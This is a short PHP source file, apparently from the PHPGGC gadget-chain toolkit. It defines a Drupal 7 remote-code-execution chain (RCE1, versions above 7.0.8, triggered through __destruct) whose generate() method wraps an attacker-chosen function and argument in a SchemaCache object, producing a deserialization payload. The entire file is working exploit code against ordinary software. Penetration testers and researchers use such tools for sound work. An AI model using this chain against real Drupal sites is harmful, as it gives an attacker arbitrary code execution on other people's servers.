<?php

namespace GadgetChain\Drupal7;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '>7.0.8';
    public $vector = '__destruct';
    public $author = 'Blaklis';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \SchemaCache($function,$parameter);
    }
}